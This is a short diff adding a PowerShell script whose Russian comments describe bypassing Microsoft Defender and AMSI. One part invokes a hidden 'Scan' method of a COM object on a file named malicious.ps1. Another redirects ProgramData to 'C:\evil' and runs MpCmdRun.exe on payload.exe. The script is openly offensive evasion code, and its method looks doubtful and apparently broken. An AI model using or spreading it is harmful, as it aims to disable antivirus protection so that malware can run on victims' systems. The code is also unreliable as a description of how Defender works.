@@ -1,0 +1,13 @@
+# Обход через Microsoft Defender COM объект
+$defender = New-Object -ComObject "Microsoft.Windows.SecHealthUI.AMSIProvider"
+
+# Используем уязвимость в AMSI Provider
+$defender.GetType().InvokeMember("Scan",
+    [System.Reflection.BindingFlags]::NonPublic -bor 
+    [System.Reflection.BindingFlags]::Instance -bor 
+    [System.Reflection.BindingFlags]::InvokeMethod,
+    $null, $defender, @("C:\temp\malicious.ps1", [ref]$null))
+
+# Или через MpCmdRun.exe с подменой переменных
+$env:ProgramData = "C:\evil"
+Start-Process "C:\Program Files\Windows Defender\MpCmdRun.exe" -ArgumentList "-Scan -ScanType 3 -File C:\temp\payload.exe"
